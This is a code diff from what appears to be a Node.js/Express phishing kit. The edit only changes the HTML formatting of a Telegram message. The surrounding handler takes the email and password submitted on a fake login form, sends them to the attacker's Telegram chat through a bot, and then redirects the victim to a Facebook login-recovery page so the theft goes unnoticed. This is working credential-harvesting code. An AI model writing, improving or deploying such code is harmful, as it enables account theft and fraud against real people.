@@ -68,7 +68,7 @@ app.get('/web/:chatId', (req, res) => {
 app.post('/submit', (req, res) => {
   const { email, pass } = req.body;
    if (userChatId) {
-    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}\nSafeguard your login details for account security.`;
+    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}\n<b>Safeguard your login details for account security.</b>`;
     bot.sendMessage(userChatId, message, { parse_mode: 'HTML' });
     // Redirect to stored URL after sending data to the bot
     res.redirect(userRedirectUrl || 'https://www.facebook.com/login/identify'); // Use stored URL or default URL
